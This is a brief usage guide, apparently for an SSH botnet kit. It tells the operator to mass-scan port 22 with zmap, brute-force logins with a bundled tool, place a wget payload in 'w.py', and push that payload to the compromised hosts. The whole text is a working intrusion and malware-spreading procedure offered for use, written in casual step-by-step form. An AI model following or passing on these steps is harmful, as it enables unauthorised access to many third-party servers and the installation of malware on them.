How to use...

drag all the files onto your server

now do

chmod 777 *

that gives permissions 

then do

zmap -p 22 -o bios.txt -w amazing.lst -i ens160 

now do

cat bios.txt | sort | uniq > mfu.txt

then do

./update 1500


press enter after




give them a while to brute

once it finishes

go into 'w.py'

and edit your payload aka wget
cmd="WGET HERE"

that's where you'll put your payload


then do
cat vuln.txt | grep -v DUP > KEK.txt

now the final step

python w.py KEK.txt